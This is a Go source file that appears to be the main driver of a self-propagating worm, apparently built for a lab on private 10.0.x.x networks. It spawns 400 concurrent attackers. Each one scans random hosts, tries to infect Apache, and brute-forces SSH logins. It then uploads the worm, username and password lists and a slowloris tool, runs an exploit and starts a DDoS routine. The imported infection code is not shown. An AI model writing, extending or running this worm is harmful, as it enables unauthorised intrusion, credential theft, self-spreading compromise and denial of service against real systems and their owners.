package main

import (
	"sync"
	"fmt"
	"github.com/99graciamanel/mlw/worm/infection"
	"github.com/99graciamanel/mlw/worm/scan"
	"github.com/99graciamanel/mlw/worm/ddos"
	"strconv"
//	"os"
)

func attack(wg *sync.WaitGroup, id int, baseIp [4]int) {
	attackerString := fmt.Sprintf("Attacker %d: ",id)
	it := 2
	var ip string
	var ports [3]int
	for i := 0; i < it; i++ {
		ip = scan.GetRandomIp(baseIp)
		//ip = "localhost"
		fmt.Println(attackerString + ip)
		ports = scan.ScanIp(ip)
		fmt.Println(attackerString)
		infected := false
		//Apache infect
		if ports[0] != 0 {
			fmt.Println(attackerString + " trying to infect apache")
			if (!infection.ApacheCheckInfection(ip, strconv.Itoa(ports[0]))) {
				infected = infection.ApacheInfect(ip,strconv.Itoa(ports[0]))
				fmt.Println(infected)
			}
		}
		//SSH infect
		fmt.Println(attackerString + " trying to infect ssh")		
		ip_port := ip + ":" + strconv.Itoa(ports[1])
		hit_credentials := infection.GuessSSHConnection(ip_port)
		if hit_credentials{
			is_infected := infection.SshCheckInfection(ip_port)
			fmt.Println(is_infected)
			if is_infected {
				continue
			}
			message := infection.SshInfect(ip_port, "worm")
			message = infection.SshInfect(ip_port, "users.txt")
			message = infection.SshInfect(ip_port, "pwds.txt")
			//message = infection.SshInfect(ip_port, "DNSlist.txt")
			//message = infection.SshInfect(ip_port, "dnsdrdos.o")
			message = infection.SshInfect(ip_port, "slowloris")
			fmt.Println(message)
			message = infection.SshExploit(ip_port)
			fmt.Println(message)
			infected = true
		}
//		if !infected && ports[1] != 0 {
//
//		}
		//Confluence infect
		if !infected && ports[2] != 0 {
			fmt.Println(attackerString + " trying to infect confluence")		
			fmt.Println("Not implemented")
			infected = true
		}
		fmt.Println(attackerString + " done")	
	}
	fmt.Println(attackerString + " attacker done")		
	
	wg.Done()
}

func main() {
	fmt.Println("hello")
//	defer f.Close()
	var wg sync.WaitGroup
	wg.Add(1)
	go ddos.Hello(&wg,"test")
	nAttackers := 400
	baseIp := [2][4]int{{10,0,2,-1},{10,0,1,-1}}
	for i := 0; i < nAttackers; i++ {
		wg.Add(1)
		go attack(&wg, i, baseIp[1])
	}
	wg.Wait()
}
